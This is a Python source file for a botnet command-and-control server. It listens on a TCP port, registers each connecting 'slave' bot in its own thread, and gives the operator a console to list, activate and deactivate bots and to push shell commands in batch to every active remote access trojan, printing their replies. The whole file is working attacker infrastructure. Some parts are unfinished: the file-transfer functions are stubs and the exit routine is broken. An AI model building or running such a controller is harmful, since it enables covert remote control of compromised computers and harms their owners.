#!/usr/bin/python3

import socket
import sys
import os
import threading
import queue
import time

q = queue.Queue()

allConnections = []         # Stores all BotHandler instances
activeConnections = []      # Stores all currently active BotHandler sessions
deadConnections = []        # Records the dead-instance's information
clientAddressList = {}      # Stores client_address[] info (IP, Port): IP is stored in string format, port is not

# -------------------------------------------------------------------------------------------

class Handler(threading.Thread):

    def __init__(self, client, client_address, active, bot_id):
        threading.Thread.__init__(self)
        self.client = client
        self.client_address = client_address
        self.ip = client_address[0]
        self.port = client_address[1]
        self.isActive = active
        self.bot_id = bot_id

        # No longer using queues and instead are using specific class execute(cmd)
        #self.q = qv            

        # This line returns 'MainThread'
        #self.BotName = threading.current_thread().getName()

    def run(self):

        # Returns 'Thread-#': Useful for specific interaction?
        # This specific line returns 'None'
        #self.BotName = threading.current_thread().getName()

        print(f"[* Handler-Msg] Slave {self.ip}:{str(self.port)} connected with Session ID of {str(self.bot_id)}")

        # [NIX'D] - Interesting, we can use strings (Thread-#) to index an array. Noted...
        clientAddressList[self.bot_id] = self.client_address
        # [NIX'D] - This is a useful array in which we can access Client information (IP, Port) by thread-id
    
    def activate(self):
        print(f"\n[*BotHandler-Msg] Activating Bot {str(self.bot_id)}...")
        self.isActive = True
    
    def deactivate(self):
        print(f"\n[*BotHandler-Msg] Deactivating {str(self.bot_id)}...")
        self.isActive = False

    def isActivated(self):
        return self.isActive
    
    def getID(self):
        return self.bot_id

    def getIP(self):
        return self.ip

    def getPort(self):
        return self.port

    def execute(self, command):

        print(f"[* BotHandler-Msg] Received Command: {str(command)} for bot {str(self.bot_id)}")

        try:
            #RecvBotCmd += "\n"

            # Send data/command to RAT
            self.client.send(command.encode('utf-8'))
            recvVal = (self.client.recv(1024)).decode('utf-8')      # Receive reply from RAT
            print(recvVal)                                          # Display message received

        except Exception as ex:
            # for t in allConnections:
            #     if t.is_alive() == False:
            #         print("\n[!] Died Thread: " + str(t))
            #         t.join()
            print(f"[* BotHandler-Msg] Unable to send connection to bot {self.bot_id} at {str(self.ip)}")
            print(f"[* BotHandler-Msg] Error: {ex}")
    
    def download(self, remotepath, localfile):
        print("TBC")

    def upload(self, localfile, remotepath):
        print("TBC")
# -------------------------------------------------------------------------------------------

class Interpreter(threading.Thread):
    def __init__(self, qv2):
        threading.Thread.__init__(self)     # Spawn a new thread for itself
        self.q = qv2                        # Queue used for issuing commands

    def run(self):

        while True:

            cmd = str(input("[TU-C2:CONSOLE]$ "))

            if (cmd == ""):
                print("[* Interpreter-Msg] Error: No command received. Try again...")
                pass
            elif (cmd.casefold() == "exit"):
                self.exit()
            elif (cmd.casefold() == "list-active"):
                self.listActive()
            elif (cmd.casefold() == "list-all"):
                self.listAll()
            elif (cmd.casefold() == "activate"):
                self.activate()
            elif (cmd.casefold() == "deactivate"):
                self.deactivate()
            elif (cmd.casefold() == "batch-mode"):
                self.batchMode()
            else:
                print("TBC")
                # print(f"[+] Sending Command: {cmd} to {str(len(allConnections))} + " bots")
                # for conn in activeConnections:                                         # for i in range(len(allConnections)):
                #     time.sleep(0.1)
                #     conn.execute(cmd)
#------------------------------------------------------------------------------------------------------------------------------
    def batchMode(self):
        print("[* Interpreter-Msg] Entering Batch-Mode execution... Enter 'quit' at any point to exit batch-mode...")
        batch_cmd = ""

        while (batch_cmd.casefold() != "quit" and batch_cmd.casefold() != "q"):
            batch_cmd = str(input("[Batch-CMD]# "))
            print(f"[+] Sending Command: {batch_cmd} to {str(len(allConnections))} bots")
            for conn in activeConnections:                                         
                time.sleep(0.1)
                conn.execute(batch_cmd)
        
        print(f"[* Interpreter-Msg] Exiting Batch-Mode... Returning to main-menu...")
#------------------------------------------------------------------------------------------------------------------------------
    def activate(self):
        try:
            selectedIDs = [int(n) for n in input('[+ Activation] Enter ID list to activate (seperated by spaces): ').split()]
            print(f"[+ Activation] ID list obtained: {str(selectedIDs)}")

        except Exception as ex:
            print(f"[* Interpreter-Msg] Error with activation list: {ex}")
            print(ex)

        else:
            for conn in allConnections:
                #print("Handler: ", str(conn))

                if conn.getID() in selectedIDs:
                    print("Activating Bot " + str(conn.getID()))
                    conn.activate()
                    activeConnections.append(conn)
#------------------------------------------------------------------------------------------------------------------------------
    def deactivate(self):
        try:
            deselectedIDs = [int(n) for n in input('[- Deactivation] Enter IDs to deactivate (seperated by spaces): ').split()]
            print(f"[- Deactivation] ID list obtained: {str(deselectedIDs)}")

        except Exception as ex:
            print(f"[* Interpreter-Msg] Error with deactivation list: {ex}")
            
        else:
            for conn in allConnections:
                if conn.getID() in deselectedIDs and conn.isActivated():
                    print(f"[* Deactivation] Deactivating Bot {str(conn.getID())}")
                    conn.deactivate()
                    activeConnections.remove(conn)
#------------------------------------------------------------------------------------------------------------------------------
    def exit(self):
        print(f"[* Interpreter-Msg] Sending Command: {cmd} to {str(len(allConnections))} bots")
        for conn in allConnections:                                         # for i in range(len(allConnections)):
            time.sleep(0.1)
            conn.execute(cmd)

        print("[* Interpreter-Msg] Exiting connection[s] for all bots Please wait...")
        time.sleep(5)
        os._exit(0)
#------------------------------------------------------------------------------------------------------------------------------
    def listActive(self):
        print("---------------------------")
        print("| List of Active Sessions |")
        print("---------------------------")

        for conn in activeConnections:
            print("| %4d | %16s |"% (conn.getID(), conn.getIP()))
            print("---------------------------")
#------------------------------------------------------------------------------------------------------------------------------
    def listAll(self):
        print("---------------------------")
        print("| List of All Connections |")
        print("---------------------------")

        for conn in allConnections:
            print("| %4d | %16s |"% (conn.getID(), conn.getIP()))
            print("---------------------------")
#------------------------------------------------------------------------------------------------------------------------------
    def clearScreen(self):
        os.system("clear")
    
#=================================================================================================================================

def listener(lhost, lport, q):

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_address = (lhost, lport)
    server.bind(server_address)
    server.listen(100)

    print(f"[* Listener] Starting Botnet listener on tcp://{lhost}:{str(lport)}\n")

    InterpreterThread = Interpreter(q)        # Handles interface, queue is for commands
    InterpreterThread.start()

    connRecord = 0

    while True:

        (client, client_address) = server.accept()  # start listening
        print(f"Connection received from {str(client_address[0])}")

        # BotHandler = Multiconn, a new BotHandler is spawned for each incoming connection
        newConn = Handler(client, client_address, False, connRecord)
        allConnections.append(newConn)
        connRecord += 1
        newConn.start()

# -------------------------------------------------------------------------------------------

#import
def main():
    if (len(sys.argv) < 3):
        print(f"[!] Usage:\n  [+] python3 {sys.argv[0]} <LHOST> <LPORT>\n  [+] Eg.: python3 {sys.argv[0]} 0.0.0.0 8080\n")
    else:
        try:
            lhost=sys.argv[1]
            lport=int(sys.argv[2])
            listener(lhost, lport, q)
        except Exception as ex:
            print(f"[-] Unable to establish the Handler. Error: {str(ex)}\n")

if __name__ == '__main__':
    main()
